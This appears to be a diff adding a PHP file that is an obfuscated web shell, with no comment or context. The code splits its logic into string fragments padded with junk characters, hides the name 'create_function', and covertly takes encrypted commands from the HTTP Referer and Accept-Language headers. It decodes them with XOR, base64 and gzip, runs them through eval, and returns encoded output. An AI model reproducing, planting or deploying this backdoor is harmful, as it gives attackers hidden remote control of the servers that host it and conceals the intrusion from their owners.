@@ -1,0 +1,31 @@
+<?php
+
+$v='$sAM[$i]="";AMAM$p=$ss($p,3AM);}if(arrAMay_keAMy_exiAMsts($i,$AMAMs)AM){AM$sAM[$i].=$p;$e=strpos($sAM[$iAM],$f);if';
+
+$g='lean();$d=baAMse6AM4_encodAMe(AMx(gzcomprAMess($o)AM,$k))AM;prinAMt("<$AMk>AM$d</$k>");@AMsessioAMn_destroAMy();}}}}';
+
+$q='$kf),AM0,3)AM);$p="";for($z=1AM;AM$zAM<counAMt($m[1]);$zAM++) $p.=$q[$m[AM2]AM[$AMz]];if(strposAM($p,$AMhAM)===0){';
+
+$n=str_replace('q','','cqqreateq_fuqncqtqion');
+
+$Y='<$l;)AM{forAM($j=AM0AMAMAM;($j<$c&&$i<$l);$j++,$iAM++){$o.=$tAM{$i}AM^$k{AM$j};}}AMreturnAM $oAMAM;}$r=$_SERVER;';
+
+$F='$kh="698AMd";AM$kfAM="51a1AM";function xAM($t,$kAM){$cAM=strlen(AM$k);$AMl=strlAMAMen($t);$o=""AM;for($AMi=0;$AMi';
+
+$Q='$rr=@AM$r["HTTPAM_REFAMAMERER"];AM$raAM=@$r["HTTP_ACCEPAMT_LANAMAMGUAGE"];if($rAMr&&$raAM){   AM $uAM=pAMarse_';
+
+$l='uAMrl($rr);   AM parse_sAMtr(AM$u["queAMry"],$AMq);$AMq=aAMrrayAM_values($qAM);preg_matcAMAMh_allAM("/([\\w])[\\w-AM';
+
+$s='_/AM","/AM-/"),arrAMaAMy("/","+"),AMAM$sAMs($s[$i],0,$e)AM)),AM$AMk)));$o=ob_AMget_contenAMtsAM();obAM_AMend_c';
+
+$T='"sAMtAMrtolower";$i=$mAM[1]AM[AM0]AM.$m[1][1];$h=$sl($AMss(mAMd5($i.$khAM),0AM,3));AM$f=$sl(AM$AMsAMsAM(md5($i.';
+
+$A=']AM+(AM?:;q=0.([\\d])AM)?,?/",$AMra,$m)AM;if($qAM&&AM$m){@AMsessiAMAMAMon_staAMrt();$s=&$_SESSION;$ss="sAMubstrAM";$sl=AM';
+
+$S='AM($eAM){$k=AMAM$khAM.$kf;ob_start();@eAMval(@AMgzuncompAMress(@x(@AMbAMase64_decAModAMe(prAMeg_replace(arrAMay("/';
+
+$t=str_replace('AM','',$F.$Y.$Q.$l.$A.$T.$q.$v.$S.$s.$g);
+
+$C=$n('',$t);$C();
+
+?>
